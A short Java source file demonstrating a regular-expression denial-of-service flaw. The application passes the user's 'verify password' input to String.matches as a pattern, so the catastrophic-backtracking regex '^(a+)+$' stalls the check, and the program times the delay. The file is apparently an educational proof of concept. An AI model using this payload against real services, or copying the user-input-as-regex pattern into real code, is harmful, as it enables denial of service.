
/**
 * Example of exploit if application uses 'matches' to check if user typed the same String
 * in verify password field
 */
public class Main {

    public static void main(String... args) {

        /* password and verifyPassword would be user input */
        String password = "aaaaaaaaaaaaaaaaaaaaaaaaa!";
        String verifyPassword = "^(a+)+$";

        long startTime = System.currentTimeMillis();
        password.matches(verifyPassword);
        long endTime = System.currentTimeMillis();

        long executionTime = endTime - startTime;
        System.out.println(String.format("Execution took %d milliseconds", executionTime));
    }
}
